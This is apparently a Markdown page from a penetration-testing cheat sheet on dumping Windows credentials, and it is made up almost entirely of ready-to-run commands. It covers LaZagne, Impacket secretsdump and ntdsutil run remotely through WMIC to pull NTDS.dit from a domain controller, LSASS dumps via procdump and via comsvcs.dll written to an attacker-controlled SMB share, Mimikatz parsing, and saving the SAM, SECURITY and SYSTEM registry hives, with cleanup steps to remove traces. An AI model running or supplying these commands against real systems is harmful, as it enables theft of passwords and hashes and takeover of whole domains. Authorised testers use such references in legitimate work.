## Tools
* [LaZagne](https://github.com/AlessandroZ/LaZagne)
    ```batch
    laZagne.exe all
    ```

---
## Dumping Credentials[^1]

### NTDS dumping

#### Impacket-secretsdump directly
```
secretsdump.py company.local/administrator:P\@ssw0rd@192.168.1.100 -outputfile secretsdump.txt -resumefile resumefile -pwd-last-set -user-status -history
```

#### ntdsutil[^2][^3]
```
ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\temp\ntdsutil" quit quit
# Via WMIC from a remote machine to DC
wmic /node:dc01.domain.com process call create "cmd.exe /c ntdsutil \"ac in ntds\" ifm \"cr fu C:\Windows\temp\ntdsutil\" q q"

# Then copy to kali and use secretsdump
secretsdump.py -ntds Active\ Directory/ntds.dit -system registry/SYSTEM -security registry/SECURITY LOCAL -pwd-last-set -user-status -history -outputfile output
```


### Procdump & Mimikatz

Useful if AV cannot be disabled and does not block procdump.exe

1. On target machine
    * Via procdump.exe
        ```batch
        procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1
        procdump64.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1
        ```
    * Via Task manager
        * Open `Task Manager` -> Details -> lsass.exe -> ++right-button++ -> "Create dump file"
    * Remote LSASS dump[^4]
        ```batch
        net use x: \\smbserver_under_your_control\c$\
        powershell -c rundll32.exe C:\windows\System32\comsvcs.dll MiniDump (Get-Process lsass).id x:\lsassdump.bin full
        ```
    
1. Retrieve file

1. On local machine (Windows)
    ```batch
    mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit
    ```

### Exporting registry hives & local decryption
1. On target machine
    ```batch
    mkdir c:\temp
    reg.exe save hklm\sam c:\temp\sam.save
    reg.exe save hklm\security c:\temp\security.save
    reg.exe save hklm\system c:\temp\system.save
    ```

1. Retrieve the files
    * See [Data Exfiltration](../../#data-exfiltration)

1. On local machine (~Kali)
    ```bash
    secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
    ```
    
1. On target machine
    ```batch
    del c:\temp\sam.save
    del c:\temp\security.save
    del c:\temp\system.save
    rmdir c:\temp # Except when the "temp" folder already existed before Step 1. # Check if there are other contents in the folder
    ```



[^1]: [Pure Security](https://pure.security/dumping-windows-credentials/)
[^2]: [c0d3xpl0it](https://www.c0d3xpl0it.com/2016/10/dumping-ntdsdit-file-from-active-directory.html)
[^3]: [Hacking Articles](https://www.hackingarticles.in/credential-dumping-ntds-dit/)
[^4]: [Responder](https://twitter.com/PythonResponder/status/1385064506049630211)
